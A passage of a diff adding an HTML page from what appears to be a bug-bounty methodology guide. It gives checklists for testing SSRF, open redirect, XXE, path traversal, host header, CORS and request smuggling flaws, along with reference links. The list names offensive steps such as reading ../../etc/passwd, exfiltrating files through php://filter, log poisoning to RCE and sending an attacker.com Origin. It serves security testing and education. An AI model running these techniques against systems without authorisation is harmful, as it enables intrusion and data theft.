+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>□ Blind SSRF → internal port scan via response time/content difference
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>OPEN REDIRECT
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>□ All redirect params: next=, url=, return=, goto=, redirect=
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>□ Bypass: //, @, backslash, subdomain confusion, fragment, encoding
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>□ Chain with OAuth redirect_uri → ATO
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>□ Chain with SSRF filter bypass → metadata access
+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>□ Report standalone only if chained or clearly impactful
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>
+</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a>XXE
+</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a>□ All XML-accepting endpoints → basic file read payload
+</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a>□ Switch JSON endpoint to XML (change Content-Type)
+</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a>□ File uploads: SVG, DOCX, XLSX, PPTX → inject XXE in XML layer
+</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a>□ SOAP endpoints: WSDL discovery, XXE in every field
+</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a>□ Blind XXE: DTD-based OOB via interactsh
+</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a>□ PHP targets: php://filter wrapper for base64 exfil
+</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a>□ XXE → SSRF: target metadata endpoint after confirming XXE
+</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a>
+</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a>PATH TRAVERSAL / LFI
+</span><span id="__span-52-26"><a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a>□ File/path/template/doc/page params → ../../etc/passwd
+</span><span id="__span-52-27"><a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a>□ Filter bypass: URL encoding, double encode, nested traversal, null byte
+</span><span id="__span-52-28"><a id="__codelineno-52-28" name="__codelineno-52-28" href="#__codelineno-52-28"></a>□ PHP targets: php://filter wrapper for source read
+</span><span id="__span-52-29"><a id="__codelineno-52-29" name="__codelineno-52-29" href="#__codelineno-52-29"></a>□ Log poisoning → RCE (Apache/Nginx access log)
+</span><span id="__span-52-30"><a id="__codelineno-52-30" name="__codelineno-52-30" href="#__codelineno-52-30"></a>□ File download endpoints → traverse to sensitive config files
+</span><span id="__span-52-31"><a id="__codelineno-52-31" name="__codelineno-52-31" href="#__codelineno-52-31"></a>□ Windows targets: ..\..\ and win.ini as confirmation
+</span><span id="__span-52-32"><a id="__codelineno-52-32" name="__codelineno-52-32" href="#__codelineno-52-32"></a>
+</span><span id="__span-52-33"><a id="__codelineno-52-33" name="__codelineno-52-33" href="#__codelineno-52-33"></a>HOST HEADER
+</span><span id="__span-52-34"><a id="__codelineno-52-34" name="__codelineno-52-34" href="#__codelineno-52-34"></a>□ Password reset poisoning (→ Part 2)
+</span><span id="__span-52-35"><a id="__codelineno-52-35" name="__codelineno-52-35" href="#__codelineno-52-35"></a>□ Host reflected in response? → cache poisoning potential
+</span><span id="__span-52-36"><a id="__codelineno-52-36" name="__codelineno-52-36" href="#__codelineno-52-36"></a>□ X-Forwarded-Host reflection → same as Host
+</span><span id="__span-52-37"><a id="__codelineno-52-37" name="__codelineno-52-37" href="#__codelineno-52-37"></a>□ SSRF via Host header routing
+</span><span id="__span-52-38"><a id="__codelineno-52-38" name="__codelineno-52-38" href="#__codelineno-52-38"></a>
+</span><span id="__span-52-39"><a id="__codelineno-52-39" name="__codelineno-52-39" href="#__codelineno-52-39"></a>CORS
+</span><span id="__span-52-40"><a id="__codelineno-52-40" name="__codelineno-52-40" href="#__codelineno-52-40"></a>□ Send Origin: https://attacker.com → reflected in ACAO?
+</span><span id="__span-52-41"><a id="__codelineno-52-41" name="__codelineno-52-41" href="#__codelineno-52-41"></a>□ Access-Control-Allow-Credentials: true also present?
+</span><span id="__span-52-42"><a id="__codelineno-52-42" name="__codelineno-52-42" href="#__codelineno-52-42"></a>□ Send Origin: null → allowed?
+</span><span id="__span-52-43"><a id="__codelineno-52-43" name="__codelineno-52-43" href="#__codelineno-52-43"></a>□ Send Origin: https://sub.target.com → wildcard subdomain allowed?
+</span><span id="__span-52-44"><a id="__codelineno-52-44" name="__codelineno-52-44" href="#__codelineno-52-44"></a>□ Both conditions met → write credentialed fetch PoC
+</span><span id="__span-52-45"><a id="__codelineno-52-45" name="__codelineno-52-45" href="#__codelineno-52-45"></a>
+</span><span id="__span-52-46"><a id="__codelineno-52-46" name="__codelineno-52-46" href="#__codelineno-52-46"></a>REQUEST SMUGGLING
+</span><span id="__span-52-47"><a id="__codelineno-52-47" name="__codelineno-52-47" href="#__codelineno-52-47"></a>□ HTTP Request Smuggler extension → safe automated probe
+</span><span id="__span-52-48"><a id="__codelineno-52-48" name="__codelineno-52-48" href="#__codelineno-52-48"></a>□ CL.TE timing probe (10-second hang = vulnerable)
+</span><span id="__span-52-49"><a id="__codelineno-52-49" name="__codelineno-52-49" href="#__codelineno-52-49"></a>□ Report type (CL.TE/TE.CL/TE.TE) and let triager assess impact
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg></span> <strong>PortSwigger Labs</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/ssrf">SSRF</a></li>
+<li><a href="https://portswigger.net/web-security/xxe">XXE</a></li>
+<li><a href="https://portswigger.net/web-security/file-path-traversal">Path traversal</a></li>
+<li><a href="https://portswigger.net/web-security/cors">CORS</a></li>
+<li><a href="https://portswigger.net/web-security/request-smuggling">Request smuggling</a></li>
+<li><a href="https://portswigger.net/web-security/host-header">Host header attacks</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M5.433 2.304A4.49 4.49 0 0 0 3.5 6c0 1.598.832 3.002 2.09 3.802.518.328.929.923.902 1.64v.008l-.164 3.337a.75.75 0 1 1-1.498-.073l.163-3.33c.002-.085-.05-.216-.207-.316A6 6 0 0 1 2 6a6 6 0 0 1 2.567-4.92 1.48 1.48 0 0 1 1.673-.04c.462.296.76.827.76 1.423v2.82c0 .082.041.16.11.206l.75.51a.25.25 0 0 0 .28 0l.75-.51A.25.25 0 0 0 9 5.282V2.463c0-.596.298-1.127.76-1.423a1.48 1.48 0 0 1 1.673.04A6 6 0 0 1 14 6a6 6 0 0 1-2.786 5.068c-.157.1-.209.23-.207.315l.163 3.33a.752.752 0 0 1-1.094.714.75.75 0 0 1-.404-.64l-.164-3.345c-.027-.717.384-1.312.902-1.64A4.5 4.5 0 0 0 12.5 6a4.49 4.49 0 0 0-1.933-3.696c-.024.017-.067.067-.067.16v2.818a1.75 1.75 0 0 1-.767 1.448l-.75.51a1.75 1.75 0 0 1-1.966 0l-.75-.51A1.75 1.75 0 0 1 5.5 5.282V2.463c0-.092-.043-.142-.067-.159"/></svg></span> <strong>Tools</strong></p>
+<hr />
+<ul>
+<li><a href="https://github.com/projectdiscovery/interactsh">interactsh</a></li>
+<li><a href="https://github.com/tarunkant/Gopherus">Gopherus</a></li>
+<li><a href="https://github.com/ryandamour/ssrfuzz">ssrfuzz</a></li>
+<li><a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">HTTP Request Smuggler (BApp)</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg></span> <strong>References</strong></p>
+<hr />
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">PayloadsAllTheThings — SSRF</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings — XXE</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">PayloadsAllTheThings — LFI</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect">PayloadsAllTheThings — Open Redirect</a></li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">ssrf</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">xxe</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">open-redirect</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">lfi</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">cors</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">request-smuggling</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-04-injection/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Injection">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Injection
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-06-business-logic/" class="md-footer__link md-footer__link--next" aria-label="Next: Business Logic">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Business Logic
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
